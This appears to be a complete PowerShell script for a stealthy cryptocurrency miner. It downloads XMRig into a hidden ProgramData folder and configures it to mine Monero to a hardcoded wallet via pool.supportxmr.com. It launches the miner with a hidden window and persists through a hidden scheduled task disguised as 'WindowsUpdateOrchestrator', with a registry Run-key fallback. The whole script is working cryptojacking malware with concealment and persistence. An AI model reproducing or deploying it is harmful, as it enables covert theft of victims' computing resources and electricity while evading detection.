# ================================================
# XMRig DEBUG DEPLOYMENT v3 - SIMPLIFIED PERSISTENCE
# Full logging, works on all Win10/11
# ================================================

$LogFile = "C:\Windows\Temp\xmr_deploy_debug_v3.log"

function Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp | $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8
    Write-Host "$Timestamp | $Message" -ForegroundColor Cyan
}

Log "=== XMRig DEBUG v3 STARTED ==="

# 1. Hidden directory
$InstallDir = "C:\ProgramData\XMRUpdate"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
}
Log "Install dir: $InstallDir"

# 2. Download & extract XMRig
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig-v3.zip"

Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
Log "Download OK"

Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue

# Move files from subfolder if needed
$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
}
Log "Extraction OK"

# 3. Find exe
$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
Log "XMRig: $ExePath"

# 4. Config (60% threads)
$Config = @{
    autosave       = $false
    colors         = $false
    cpu            = @{ enabled = $true; "max-threads-hint" = 60 }
    "donate-level" = 0
    pools          = @(@{
        algo      = "rx/0"
        url       = "pool.supportxmr.com:443"
        user      = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
        pass      = "x"
        keepalive = $true
        tls       = $true
        "rig-id"  = $env:COMPUTERNAME
    })
    "print-time"   = 60
} | ConvertTo-Json -Depth 10

$ConfigPath = "$InstallDir\config.json"
$Config | Out-File $ConfigPath -Encoding UTF8 -Force
Log "Config created"

# 5. Start miner hidden
Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden
Log "Miner started hidden"

# 6. SIMPLE Persistence (fallback that always works)
$TaskName = "WindowsUpdateOrchestrator"

$Action  = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
$Trigger = New-ScheduledTaskTrigger -AtLogOn

$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit (New-TimeSpan -Days 999)
$Settings.Hidden = $true

try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
    Log "SUCCESS: Task created (AtLogOn)"
} catch {
    Log "Task creation failed: $($_.Exception.Message)"
    # Ultra-simple fallback: Registry Run key (works without admin in many cases)
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $RegPath -Name "WindowsUpdateOrchestrator" -Value "`"$ExePath`" -c `"$ConfigPath`" -B --no-color" -Force
    Log "Fallback: Registry Run key created"
}

Log "=== XMRig DEBUG v3 FINISHED ==="
Log "Check miner now:   tasklist | findstr xmrig"
Log "Check task:        schtasks /query /tn `"$TaskName`""
Log "Log file: $LogFile"
